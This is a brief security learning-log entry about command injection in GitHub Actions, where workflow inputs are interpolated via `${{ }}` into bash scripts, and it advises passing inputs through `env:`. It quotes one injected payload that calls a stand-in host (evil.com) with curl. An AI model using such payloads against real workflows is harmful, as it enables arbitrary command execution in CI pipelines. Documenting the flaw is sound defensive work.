## 2024-05-24 - [Command Injection via GitHub Actions Inputs]
**Vulnerability:** Untrusted user input via `github.event.inputs` is interpolated directly into bash `run:` scripts in multiple GitHub Actions workflows using `${{ ... }}` syntax. This allows command injection if a user inputs payload like `" ; curl evil.com ; "`.
**Learning:** GitHub Actions performs macro-style string replacement for `${{ }}` blocks before the shell parses the script, treating whatever is inside as part of the script itself, bypassing bash string quoting.
**Prevention:** Always pass user-controlled input into shell scripts via the `env:` block and reference them as bash variables (e.g. `$INPUT_VAR`), allowing the shell to properly quote and sanitize the values.
